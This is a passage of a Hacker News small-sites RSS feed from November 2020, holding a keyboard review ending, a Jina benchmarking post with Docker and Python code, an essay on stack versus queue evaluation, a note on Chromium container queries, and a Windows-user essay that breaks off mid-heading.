quite fluent, can manage without a cheatsheet, but still - just painfully slooow. The new automations (you don't need to think about) are not (yet) there, and the old ones got rusty already (when I try to use Das Keyboard occasionally). Ahh, yeah - I've mentioned the printed cheat sheet - it comes in the box with the keyboard, it's laminated, and it's a hell of help - especially in the first few days. A decent idea - kudos for that.</p><p>To be honest, I think that those few weeks are still too little to make a proper judgment, so let's consider it an early review and revisit in few months time.</p><p>IMHO, Atreus delivers what it promises. </p><p>It's compact and lightweight indeed. The quality (of manufacturing) is flawless - sharp, raw, minimalistic, yet beautiful.</p><p>Overall, it's my 2nd favorite of all mech keyboards I've ever used (runner up only to the <a href="https://www.wasdkeyboards.com/wasd-v3-88-key-iso-custom-mechanical-keyboard.html">Cherry MX Clear 88-key WASD</a>), and that says a lot. Yes, this position has been earned mainly by the outstanding switches and the unquestionable mobility, but it's not that I classify the layout as a con. It does require time to adjust your habits, but it's hard to name even a single, irrevocably bad design decision (in terms of positioning or spacing) - with <strong>Tab</strong> positioning being the most controversial one.</p><p>Btw. if you don't like any particular key position, there's a dedicated piece of software (Chrysalis: <a href="https://github.com/keyboardio/Chrysalis">https://github.com/keyboardio/Chrysalis</a>) you can use to conveniently remap it (in the end: I didn't remap any single key).</p><p>It should be stated very clearly - IMHO, this keyboard is <strong><u>much better suited for typists</u></strong> than e.g., developers (or gamers), but even for a typist, it will take several weeks to get used to it and regain a proper pace of typing. What does it mean 'proper pace'? Is it possible to get as effective as with a standard IBM Model M layout?</p><p>Opinions vary.</p><p>Personally, I don't think so, but please keep in mind that this is not a 105-cap but 44-cap keyboard - some efficiency is intended to be sacrificed for the compactness. Consider carefully the scenarios you'd like to use it for, before, not after buying.</p>
	</section>

	
</article></div>]]>
            </description>
            <link>https://no-kill-switch.ghost.io/keyboardio-atreus-yeah-or-meh-review/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25056988</guid>
            <pubDate>Wed, 11 Nov 2020 09:45:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Benchmark a Decentralized Search System on 79 Past Releases]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25056863">thread link</a>) | @pepperwool
<br/>
November 11, 2020 | https://hanxiao.io/2020/11/10/Optimizing-the-Overhead-of-a-Decentralized-Search-System/ | <a href="https://web.archive.org/web/*/https://hanxiao.io/2020/11/10/Optimizing-the-Overhead-of-a-Decentralized-Search-System/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://get.jina.ai/" target="_blank" rel="noopener">Jina</a> is designed as a decentralized system from day one. Components are modularized as microservices, which we call <a href="https://github.com/jina-ai/jina/tree/master/docs/chapters/101#peas" target="_blank" rel="noopener">Pea/Pod</a> in Jina idioms. The data passing is done via <a href="https://zeromq.org/" target="_blank" rel="noopener">ZeroMQ</a> and <a href="https://grpc.io/" target="_blank" rel="noopener">gRPC</a>. Comparing to the traditional deep learning frameworks that follow a monolith architecture, latency and overhead are something the community and we care about a lot.<a id="more"></a></p><p>From the first release <code>v0.1</code> in May 2020 to <code>0.7.7</code> today, we have released 79 versions, including 2800+ new commits with 35K lines changes from 50+ contributors. How is the indexing and querying speed now comparing to May? Most importantly, how can we even benchmark fairly over different releases?</p><video width="90%" controls="" muted="" loop="" poster="https://hanxiao.io/2020/11/10/Optimizing-the-Overhead-of-a-Decentralized-Search-System/2fba5081.png"><br><source src="https://hanxiao.io/2020/11/10/Optimizing-the-Overhead-of-a-Decentralized-Search-System/index-speed.mp4" type="video/mp4"><br>Your browser does not support the HTML5 video tag. :(<br></video><p>This post will explain our containerized benchmark environment and highlight those changes made in the last few months that significantly improve/degrade the performance.</p><div><p><strong>Jina</strong> is an easier way for enterprises and developers to build cross- &amp; multi-modal neural search systems on the cloud. You can use Jina to bootstrap a text/image/video/audio search system in minutes. Give it a try:</p><p><a href="https://get.jina.ai/" target="_blank" rel="noopener"><img src="https://img.shields.io/github/stars/jina-ai/jina?label=Star%20Jina%20on%20Github&amp;style=for-the-badge&amp;logo=github&amp;color=3aa373" alt="GitHub Repo stars"></a></p></div><h4><span id="table-of-content">Table of Content</span></h4><ul><li><a href="#containerized-benchmark">Containerized Benchmark</a><ul><li><a href="#benchmark-task">Benchmark Task</a></li><li><a href="#reproducible-experiment-via-containerization">Reproducible Experiment via Containerization</a></li></ul></li><li><a href="#quick-analysis-on-the-speed">Quick Analysis on the Speed</a><ul><li><a href="#index-speed">Index Speed</a></li><li><a href="#query-speed">Query Speed</a></li></ul></li><li><a href="#summary">Summary</a></li></ul><h2><span id="containerized-benchmark">Containerized Benchmark</span></h2><h4><span id="benchmark-task">Benchmark Task</span></h4><p>If you are a Jina user, then you must know <code>jina hello-world</code>: an one-liner that showcases the entire index and query workflows on Fashion-MNIST dataset. It indexes 60,000 images via an index flow. The vectorized data is stored into multiple shards. It then randomly samples test set as queries, ask Jina to retrieve relevant results. Below is Jinaâ€™s retrievals, where the left-most column is query image.</p><p><img src="https://hanxiao.io/2020/10/28/Mindspore-powered-Neural-Search-in-Jina/hello-world.gif"></p><p>This one-liner demo has been shipped in every Jina releases since <code>v0.1</code>, with a consistent high-level task across versions regardless the changes of the low-level API. This is perfect for serving as our benchmark task. The code snippet below shows the sketch of the benchmark function:</p><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br></pre></td><td><pre><span><span><span>def</span> <span>benchmark</span><span>()</span>:</span></span><br><span>    <span>try</span>:</span><br><span>        <span>from</span> jina <span>import</span> __version__</span><br><span>        <span>from</span> jina.flow <span>import</span> Flow</span><br><span></span><br><span>        </span><br><span></span><br><span>        </span><br><span>        f = Flow.load_config(resource_filename(<span>'jina'</span>, <span>'/'</span>.join((<span>'resources'</span>, <span>'helloworld.flow.index.yml'</span>))))</span><br><span>        st = time.perf_counter()</span><br><span>        <span>with</span> f:</span><br><span>            f.index(input_numpy(load_mnist(<span>'original/index'</span>)), batch_size=<span>1024</span>)</span><br><span>        index_time = time.perf_counter() - st</span><br><span></span><br><span>        </span><br><span>        f = Flow.load_config(resource_filename(<span>'jina'</span>, <span>'/'</span>.join((<span>'resources'</span>, <span>'helloworld.flow.query.yml'</span>))))</span><br><span>        st = time.perf_counter()</span><br><span>        <span>with</span> f:</span><br><span>            f.search(input_numpy(load_mnist(<span>'original/query'</span>), size=query_size), batch_size=<span>1024</span>, top_k=<span>50</span>)</span><br><span>        query_time = time.perf_counter() - st</span><br><span></span><br><span>    <span>except</span> Exception:</span><br><span>        </span><br><span>        </span><br><span>        </span><br><span>    <span>return</span> {</span><br><span>        <span>'version'</span>: __version__,</span><br><span>        <span>'index_time'</span>: index_time,</span><br><span>        <span>'query_time'</span>: query_time,</span><br><span>        <span>'index_qps'</span>: index_size / index_time,</span><br><span>        <span>'query_qps'</span>: query_size / query_time,</span><br><span>    }</span><br></pre></td></tr></tbody></table></figure><p>Although Jina today provides many handy interfaces such as <code>Flow.index_ndarray()</code> and <code>TimeContext</code>, allowing you to write the same code more concisely; they are not necessarily available in the early versions. To maximize the compatibility, I use a very <strong>primitive style</strong> of Jina programming. I even put <code>from jina import ...</code> inside the try-except block, in case we donâ€™t have those interfaces (or in a different module structure) in the early version. Readers should not take it as the best practice.</p><h4><span id="reproducible-experiment-via-containerization">Reproducible Experiment via Containerization</span></h4><p>So we want to run <code>benchmark()</code> by looping over all releases. Of course no one want to <code>pip</code> install one by one and mess up the local environment. We want to conduct each experiment in a clean and immutable environment, and make sure the whole set is reproducible.</p><p>I use the Docker image tagged with <code>jinaai/jina:x.y.z</code> published on every patch release. It is a self-contained image based on <code>python:3.7.6-slim</code> with all dependencies installed. My benchmark function (<code>app.py</code>) has to be running inside these containers to get an accurate result. Here is how the <code>Dockerfile</code> of a benchmark container looks like:<br></p><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></pre></td><td><pre><span><span>ARG</span> JINA_VER</span><br><span></span><br><span><span>FROM</span> jinaai/jina:$JINA_VER</span><br><span></span><br><span><span>WORKDIR</span><span> workspace/</span></span><br><span></span><br><span><span>ADD</span><span> app.py ./  </span></span><br><span></span><br><span><span>ENTRYPOINT</span><span> [<span>"python"</span>, <span>"app.py"</span>]  </span></span><br></pre></td></tr></tbody></table></figure><p>Note, <code>ARG</code> is put in front of <code>FROM</code> to make version number as a parameter, so that one can choose a specific version for benchmarking. I then wrap <code>docker build</code> and <code>docker run</code> with a simple Bash script, which lists all releases and loops over them:<br></p><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></pre></td><td><pre><span>JINA_VERS=$(git ls-remote --tags https://github.com/jina-ai/jina.git <span>"refs/tags/v*^{}"</span> | cut -d<span>'/'</span> -f3 | cut -d<span>'^'</span> -f1 | cut -d<span>'v'</span> -f2 | sort -Vr)</span><br><span></span><br><span><span>for</span> VER <span>in</span> <span>$JINA_VERS</span></span><br><span><span>do</span></span><br><span>  docker build --build-arg JINA_VER=<span>$VER</span> . -t latency-tracking</span><br><span>  docker run -v $(<span>pwd</span>)/output:/workspace/output -v $(<span>pwd</span>)/original:/workspace/original latency-tracking</span><br><span><span>done</span></span><br></pre></td></tr></tbody></table></figure><p>The figure below illustrates this procedure, where the results are aggregated to <code>benchmark.json</code>:</p><p><img src="https://hanxiao.io/2020/11/10/Optimizing-the-Overhead-of-a-Decentralized-Search-System/container-env.png"></p><p>The source code behind the benchmark environment <a href="https://github.com/jina-ai/latency-tracking" target="_blank" rel="noopener">can be found here</a>.</p><h2><span id="quick-analysis-on-the-speed">Quick Analysis on the Speed</span></h2><p>I run the benchmark on a 6-Core i7 machine with 32GB memory, with parallelization and sharding set to 4. In the end, the earliest version I can benchmark is <code>v0.0.8</code>. That was on Apr. 23, 2020, one week before first release.</p><h4><span id="index-speed">Index Speed</span></h4><p><img src="https://hanxiao.io/2020/11/10/Optimizing-the-Overhead-of-a-Decentralized-Search-System/51c3bf2e.png"></p><ul><li>The index speed has increased from 2000 docs/s to around 4000 docs/s over last few months.</li><li>The <code>hello-world</code> indexing time for 60,000 docs is reduced from 32 seconds at <code>0.0.8</code> to 14 seconds at <code>0.7.7</code>.</li><li>Besides continuous refactoring, the major improvements come from:<ul><li>Introducing <code>zmqstream</code> &amp; async IO around <code>0.3</code></li><li><a href="https://hanxiao.io/2020/08/28/What-s-New-in-Jina-v0-5/#hello-world-after-refactoring">Unifying <code>Document</code> structure and <code>Chunk</code> structure into one representation around <code>0.5</code></a></li><li>Removing <code>gzip</code> compression on <code>Document</code> and <a href="https://hanxiao.io/2020/09/21/Numpy-Tricks-and-A-Strong-Baseline-for-Vector-Index/#removing-gzip-compression">using <code>memmap</code> for <code>KVIndexer</code> &amp; <code>NumpyIndexer</code> around <code>0.6</code></a></li><li>Optimizing ZeroMQ binary protocol and <a href="https://github.com/jina-ai/jina/pull/1210" target="_blank" rel="noopener">introducing LazyRequest around 0.7</a></li></ul></li></ul><h4><span id="query-speed">Query Speed</span></h4><p><img src="https://hanxiao.io/2020/11/10/Optimizing-the-Overhead-of-a-Decentralized-Search-System/d3c56f81.png"></p><ul><li>The query speed has increased from 20 docs/s to around 70 docs/s over last few months.</li><li>The major improvement around <code>0.4</code> is due to unifying <code>Document</code> structure and <code>Chunk</code> structure.</li><li>The major setback around <code>0.6</code> is due to the use of <code>memmap</code> for <code>KVIndexer</code> &amp; <code>NumpyIndexer</code>. The search shifts away from <strong>in-memory search</strong> to <strong>on-disk search</strong>.</li><li>The slowly degraded query speed from <code>0.4</code> to <code>0.7</code> could be due to the refactoring on <code>Executor</code> and <code>Driver</code>, from then we have made <code>Executor</code> Protobuf-agnostic and algorithm-focus. Moreover, we have decoupled many huge all-in-one <code>Driver</code> into small pieces and then use them in a chain-style. <a href="https://hanxiao.io/2020/08/28/What-s-New-in-Jina-v0-5/#new-query-language-driver"><code>QueryLangDriver</code> introduced in <code>0.5</code> is a good example</a>. Though this effort is a sensible design decision and clarifies code structures, it may add extra dispatch overheads.</li><li>Need to keep an eye on the query speed in the future releases. More comprehensive analysis on the overhead is required. Avoid unnecessary work at the query time.</li></ul><h2><span id="summary">Summary</span></h2><p>Like traveling with a time machine, it is fun to look back on what we had back in May. Interestingly, the architecture and high-level user experience are consistent enough to benchmark all history versions. Four things made this benchmark possible:</p><ul><li>The <code>hello-world</code> demo defines a high-level task that is fixed across all releases.</li><li>Along with PyPI package on each release, we publish a Docker images with dependencies included, providing an immutable â€œplaybackâ€� environment.</li><li><a href="https://hanxiao.io/2020/08/02/Layer-of-Abstraction-when-Building-Tensorflow-for-Search/" title="Jina's multi-abstraction-layer design">Jina's multi-abstraction-layer design</a> separates its high-level API from the intermediate and low-level API, allowing search developers to be agnostic on the lower-level changes.</li><li>Last but not least, <strong>high code quality</strong> and robust DevOps &amp; CICD infra from day one.</li></ul><p>If youâ€™d like to share some experiences and thoughts on latency issues, welcome to join <a href="https://hanxiao.io/2020/08/06/Engineering-All-Hands-in-Public/" title="our monthly Engineering All Hands via Zoom or Youtube live stream">our monthly Engineering All Hands via Zoom or Youtube live stream</a>. If you like Jina and want to join us as a full-time AI / Backend / Frontend developer, please submit your CV to <a href="https://career.jina.ai/" target="_blank" rel="noopener">our job portal</a>. Letâ€™s build the next neural search ecosystem together!</p></div></div>]]>
            </description>
            <link>https://hanxiao.io/2020/11/10/Optimizing-the-Overhead-of-a-Decentralized-Search-System/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25056863</guid>
            <pubDate>Wed, 11 Nov 2020 09:23:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A curious case of stacks and queues]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25056603">thread link</a>) | @oecumena
<br/>
November 11, 2020 | http://www.cofault.com/2020/11/a-curious-case-of-stacks-and-queues.html | <a href="https://web.archive.org/web/*/http://www.cofault.com/2020/11/a-curious-case-of-stacks-and-queues.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When studying computing science we all learn how to convert an expression in the "normal" ("<a href="https://en.wikipedia.org/wiki/Infix_notation">infix</a>", "algebraic") notation to "<a href="https://en.wikipedia.org/wiki/Reverse_Polish_notation">reverse Polish</a>" notation. For example, an expression "<code>a*b + c*d</code>" is converted to "<code>a b * c d * +</code>". An expression in reverse Polish notation can be seen as a program for <a href="https://en.wikipedia.org/wiki/Pushdown_automaton">a stack automaton</a>:

</p><div><pre><code>PUSH A
PUSH B
MUL
PUSH C
PUSH D
MUL
ADD</code></pre></div>

<p>Where <code>PUSH</code> pushes its argument on the top of the (implicit) stack, while <code>ADD</code> and <code>MUL</code> pop 2 top elements from the stack, perform the respective operation and push the result back. 
</p><p>For reasons that will be clearer anon, let's re-write this program as
</p><div><pre><code>Container c;
c.put(A);
c.put(B);
c.put(c.get() * c.get())
c.put(C);
c.put(D);
c.put(c.get() * c.get())
c.put(c.get() + c.get())</code></pre></div>

<p>Where <code>Container</code> is the type of stacks, <code>c.put()</code> pushes the element on the top of the stack and <code>c.get()</code> pops and returns the top of the stack. <a href="https://en.wikipedia.org/wiki/LIFO">LIFO</a> discipline of stacks is so widely used (implemented natively on all modern processors, built in programming languages in the form of call-stack) that one never ask whether a different method of evaluating expressions is possible.
</p><p>Here is a problem: find a way to translate infix notation to a program for a queue automaton, that is, in a program like the one above, but where <code>Container</code> is the type of <a href="https://en.wikipedia.org/wiki/FIFO_(computing_and_electronics)">FIFO</a> <a href="https://en.wikipedia.org/wiki/Queue_(abstract_data_type)">queues</a> with <code>c.put()</code> enqueuing an element at the rear of the queue and <code>c.get()</code> dequeuing at the front. This problem was <a href="https://www.cs.utexas.edu/users/EWD/ewd08xx/EWD887.PDF">reportedly</a> solved by <a href="https://en.wikipedia.org/wiki/Jan_L._A._van_de_Snepscheut">Jan L.A. van de Snepscheut</a> sometime during spring 1984.

</p><p>While you are thinking about it, consider the following tree-traversal code (in some abstract imaginary language):
</p><div><pre><code>walk(Treenode root) {
        Container todo;
        todo.put(root);
        while (!todo.is_empty()) {
                next = todo.get();
                visit(next);
                for (child in next.children) {
                        todo.put(child);
                }
        }
}</code></pre></div>
<p>Where <code>node.children</code> is the list of node children suitable for iteration by <code>for</code> loop.
</p><p>Convince yourself that if <code>Container</code> is the type of stacks, tree-walk is depth-first. And if <code>Container</code> is the type of queues, tree-walk is breadth-first. Then, convince yourself that a depth-first walk of the parse tree of an infix expression produces the expression in Polish notation (unreversed) and its breadth-first walk produces the expression in "queue notation" (that is, the desired program for a queue automaton). Isn't it marvelous that traversing a parse tree with a stack container gives you the program for stack-based execution and traversing the same tree with a queue container gives you the program for queue-based execution?
</p><p>I feel that there is something deep behind this. <a href="https://en.wikipedia.org/wiki/Alexander_Stepanov">A. Stepanov</a> had an intuition (which cost him <a href="http://www.stlport.org/resources/StepanovUSA.html">dearly</a>) that <em>algorithms are defined on algebraic structures</em>. Elegant interconnection between queues and stacks on one hand and tree-walks and automaton programs on the other, tells us that the correspondence between algorithms and structures goes in both directions.

</p></div></div>]]>
            </description>
            <link>http://www.cofault.com/2020/11/a-curious-case-of-stacks-and-queues.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25056603</guid>
            <pubDate>Wed, 11 Nov 2020 08:36:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Container Queries are coming to Chromium]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25056551">thread link</a>) | @LorenzA
<br/>
November 11, 2020 | https://www.bram.us/2020/11/05/container-queries-are-coming-to-chromium/?ref=webdesignernews.com | <a href="https://web.archive.org/web/*/https://www.bram.us/2020/11/05/container-queries-are-coming-to-chromium/?ref=webdesignernews.com">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<div id="primary">
<main id="main">
<article id="post-25159">

<div>
<p><img loading="lazy" src="https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon.png" alt="" width="2024" height="880" srcset="https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon.png 2024w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-560x243.png 560w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-1120x487.png 1120w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-768x334.png 768w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-1536x668.png 1536w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-1568x682.png 1568w" sizes="(max-width: 2024px) 100vw, 2024px" data-old-src="https://www.bram.us/wordpress/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon.png" data-srcset="https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon.png 2024w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-560x243.png 560w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-1120x487.png 1120w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-768x334.png 768w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-1536x668.png 1536w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-1568x682.png 1568w"></p>
<p>Just <a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/u1AKdrXhPGI/m/wrJb-unhAgAJ">announced</a> on the Chromium mailing list is an <a href="https://www.chromium.org/blink/launching-features">“Intent to Prototype”</a> Container Queries, which is quite exciting news 🎉</p>
<details>
<summary>🤔 Container Queries?</summary>
<p>Container Queries allow authors to style elements according to the size of a container. This is similar to a @media query, except that it evaluates against a container instead of the viewport.</p>
</details>
<p>The experimental implementation will follow <a href="https://gist.github.com/mirisuzanne/748169312f110d6246e092945673b16e">Miriam Suzanne’s proposal</a>, which looks like this:</p>
<pre><code>main,
aside {
  contain: size; /* (1) Create an implicit "container root" or "containment context" */
}

.media-object {
  display: grid;
  gap: 1em;
}

@container (max-width: 45em) { /* (2) When the nearest `contain: size` ancestor has a max-width of 45em … */
  .media-object { /* … apply these rules onto .media-object */
    grid-template: 'img content' auto / auto 1fr;
  }
}</code></pre>
<p>Using <code>contain: size</code> <em>(1)</em> will create an implicit “container root” or “containment context” on that element. Elements contained inside it can then have container queries applied onto them, by use of a new at-rule <code>@container (<em>&lt;container-media-query&gt;</em>)</code> <em>(2)</em>. The target selector and CSS rules to apply in that case are nested within the <code>@container</code> at-rule, just like we already do with other at-rules.</p>
<p>In the example above extra rules will be applied to <code>.media-object</code> whenever its nearest ancestor with size containment set — such as <code>&lt;main&gt;</code> or <code>&lt;aside&gt;</code> — has a <code>max-width</code> of <code>45em</code>.</p>
<p>~</p>
<p>A <a href="https://github.com/dbaron/container-queries-implementability#proposal">previous version of this proposal by L. David Baron</a> required a context selector to be set, but that has been dropped here. The <code>@container</code> rule from Miriam’s version will work in any containment context <em>(read: the nearest parent element that has <code>contain: size</code> set)</em>. The syntax might still change, but that’s irrelevant to the prototype which is to be implemented:</p>
<blockquote><p>This is not at all finalized, but the underlying problems we need to solve in Blink are (mostly) the same regardless of how the feature is accessed, so we’ll for now use this proposal as the temporary syntax.</p></blockquote>
<p>~</p>
<p><a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/u1AKdrXhPGI/m/wrJb-unhAgAJ">Intent to Prototype: Container Queries →</a><br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1145970">Chrome Tracking Bug →</a></p>
<div>
<p><b>Did this help you out? Like what you see?<br>Thank me with a coffee.</b></p><p>I don't do this for profit but a small one-time donation would always put a smile on my face. Thanks!</p>
<p><a href="https://www.paypal.me/bramus/3EUR">☕️ Buy me a Coffee <em>(€3)</em></a></p>
</div>
</div>

<div>

<p>
Bramus is a Freelance Web Developer from Belgium. From the moment he discovered view-source at the age of 14 <em>(way back in 1997)</em>, he fell in love with the web and has been tinkering with it ever since <i><a href="https://www.bram.us/about">(more …)</a></i> <a href="https://www.bram.us/author/bramus/" rel="author">
View more posts </a>
</p>
</div>
</article>
<nav role="navigation" aria-label="Posts">
<h2>Post navigation</h2>

</nav>

</main>
</div>
</div></div>]]>
            </description>
            <link>https://www.bram.us/2020/11/05/container-queries-are-coming-to-chromium/?ref=webdesignernews.com</link>
            <guid isPermaLink="false">hacker-news-small-sites-25056551</guid>
            <pubDate>Wed, 11 Nov 2020 08:28:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Being a minority in fancy coding land: a Windows user]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25056380">thread link</a>) | @flo_hu
<br/>
November 10, 2020 | https://blog.esciencecenter.nl/being-a-minority-in-fancy-coding-land-a-windows-user-d853d80a6ef9 | <a href="https://web.archive.org/web/*/https://blog.esciencecenter.nl/being-a-minority-in-fancy-coding-land-a-windows-user-d853d80a6ef9">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h2 id="8c04">How I slowly went from my imposter-syndrome hiding to accepting what I am. A Windows user, at least most of the time. (Don’t worry, this is NOT one of those Linux vs. Windows posts!)</h2><div><div><div><div><a href="https://medium.com/@f.huber?source=post_page-----d853d80a6ef9--------------------------------" rel="noopener"><div><p><img alt="Florian Huber" src="https://miro.medium.com/fit/c/96/96/1*sv95w_DZibIhPBTosB6R2w.jpeg" width="48" height="48"></p></div></a></div></div></div></div><p id="c959">I work at the <a href="http://esciencecenter.nl/" rel="noopener">Netherlands eScience Center</a>, a wonderful organization with very nice colleagues. Hopefully nice enough to stay my colleagues after the following confession: I am a Windows user.</p><p id="a268">What’s so special about this? Most people use Windows, right? <br>Well, not in my small <em>coding bubble</em>. <br>In the world I work in (use all your cliché imagination on nerds, hackers, computer scientists … but then remove those pictures of people wearing sun glasses indoors and desks full of pizza and caffeine-rich soft-drinks) coding from a Windows environment is often considered something between a no-go and a handicap. Breathing quickly, my fingers start to tremble as I write this, risking my career as a data scientist and machine learning practitioner. Or isn’t it all that bad?</p></div></div><div><div><h2 id="738b">How did I end up using Windows?</h2><p id="64d2"><em>(I see your shaking heads… why the hell did he end up there?)</em><br>Let’s just say I have grown into it. All the way from <a href="https://en.wikipedia.org/wiki/MS-DOS" rel="noopener">MS DOS</a> through many painfully bad Windows versions and then I got so used to it that <strong>my skills to deal with it always felt better than my skills in handling the alternatives</strong>.</p><p id="4c26">In addition, I am not a software developer or computer scientist by training. For a long time I was a physicist, a scientist, an academic. And in the scientific fields where I was working, using Windows was — believe it or not —the norm.</p><p id="061d">Sure, I had already installed VirtualBox on my computer to run Ubuntu. I had even done some stuff with Ubuntu, including training some machine learning models (for implementations for which the packages didn’t support Windows…). I knew the 10 most common shell commands and everything else I would simply look up when needed. No wonder working with Linux still feels like writing a long letter with my left hand (I am right handed): I am terribly slow and in the end it looks horrible.</p><h2 id="4cbb">But … why?</h2><p id="fb46">Ah, I see. That all sounds like lame excuses to you.<br>Well, it is not that I didn’t see all those golden merits of using Linux over Windows. Of course that’s the better system for many tasks, say setting up a server or handling access rights. And yes, it is much less wasteful in using hardware resources, it is considered less vulnerable, … and so on … , plus it is freely available without commercial interests. Still, I never wanted to pay the price of not having access to some of the high-end software that you would get on mac-OS or Windows (such as some MS office stuff or Adobe products). By the way: I am not trying to convince anybody that Windows is the best option. I am already happy if we can agree that it is<strong> <em>an</em></strong> option.</p><p id="5163">Time for another uncomfortable revelation: sometimes, being lazy simply pays off. For instance if you need to sort out a huge pile of stuff with some emotional value to you. Just put it in a box and hide it, take it out 10 years later and easily decide to dump nearly all of it. That’s a bit what I did with Linux. I survived with minimal use of VirtualBx and alike. Until recently, <em>finally!</em>, Linux became part of Windows. And that works pretty well for me. <a href="https://www.howtogeek.com/249966/how-to-install-and-use-the-linux-bash-shell-on-windows-10/" rel="noopener">See how simple it now is to run Linux from Windows 10.</a> And enjoy how easily you now can have the best of both worlds (not for nothing are more and more people arguing <a href="https://towardsdatascience.com/dual-boot-is-dead-windows-and-linux-are-now-one-27555902a128" rel="noopener">that the good old “dual boot” is dead</a> for exactly this reason).</p></div></div><div><div><p id="617d">Enough all-united-hippie-talk. Let me share a few impressions of the actual life of an aspiring data scientist/research software engineer that happens to use Windows:</p><h2 id="5753">Starting a new job.</h2><p id="d098">I did a lot of programming as a researcher, but clearly I had never learned the proper software development basics such as testing, versioning etc. (in many academic fields those terms are often still unheard of!). No wonder I suffered a lot from imposter syndrome in the very beginning.</p><blockquote><p id="63c1"><em>I hope they won’t find out I can’t write proper code!</em></p></blockquote><p id="1c35">Naturally, that means that you might not immediately ask your colleagues for help, because that would reveal your amateur level, right?<br>But even worse, imagining you ask that colleague about how to get that Python package working and it turns out you are using Windows?</p><blockquote><p id="3038">Can you help me setting up that environment? … By the way … I use Windows for that.</p></blockquote><p id="9df6">The looks you get are suggesting that you have just asked how to import a 5GB .csv file into your Excel table (<em>*you don’t*</em>). So little surprise I did spend a fair amount of time in Forum-Land during my first months…</p><h2 id="e8ad">Being that Windows user in the room</h2><p id="0abd">You sit in that hands-on workshop on some fancy programming techniques, and the instructors asks:</p><blockquote><p id="6f37">Is there anybody using Windows? (chuckles)</p></blockquote><p id="a471">Or, actually worse, nobody asks. Of course the instructions are only given for Linux and mac-OS. Well, at least I can hide my Windows handicap for a little longer then… but <strong>NO</strong>!, when the instructor walks around to inspect the progress of the participants she/he will of course shout out:</p><blockquote><p id="ec64">Wow … you are really using Windows for that!?</p></blockquote><p id="0f4b">Great. Now officially being tagged as <strong>the Windows user</strong> in the room. Better keep quiet and not ask any silly questions then…</p><h2 id="d5b7">Get used to rolled eyes —then secretly roll your eyes, too.</h2><p id="2553">As I grew more confident of what I was doing, the imposter syndrome started to disappear. It still occasionally comes back to say hello (for instance if people speak shell over coffee), but that’s OK.</p><p id="9f7e">In the end it’s luckily the results that matters most. I learned that you can write as good or bad code on Windows as on Linux. You can build great software on Windows that is then used by Linux people, and the other way around. Sure, for some things you better go the Linux way. But it turns out that in my projects this is less than 1% of my working time, which makes it OK to be a bit clumsy using it. And secretly (<em>don’t point at them, that’s mean!</em>), I can also enjoy those moments when another colloquium presentation doesn’t run properly because Ubuntu did not work well with the projector, or the microphone, or both.</p><h2 id="7d78">Do better than pointing at each other</h2><p id="7527">Windows is more convenient for running some very common software (e.g. MS office), Linux is more stable… so go some cliches. But instead of fighting about what’s better (or hiding what feels inferior) it makes more sense to me to accept what’s there and simply go along with it. If somebody lives in a very geeky bubble it works fine to safely assume everyone runs their code on a certain operating systems and knows the in and outs of object oriented programming and containerization. But many of the more exciting projects involve people outside this bubble: researchers, users, future contributors, students. And they might as well — lo and behold — be using Windows (and by the way: containers are still primarily <strong>big steel boxes</strong> to most people).</p><p id="2b2a">So, even though in some IT-bubbles it can occasionally feel as if we are talking about a small unfortunate minority … in reality that’s really not true. Check out <a href="https://www.freecodecamp.org/news/stack-overflow-developer-survey-2020-programming-language-framework-salary-data/" rel="noopener">the 2020 Stack Overflow Developer Survey</a> to see that <strong>most developers actually use Windows</strong>.</p><h2 id="a2c4">What can you do to get more Windows users to 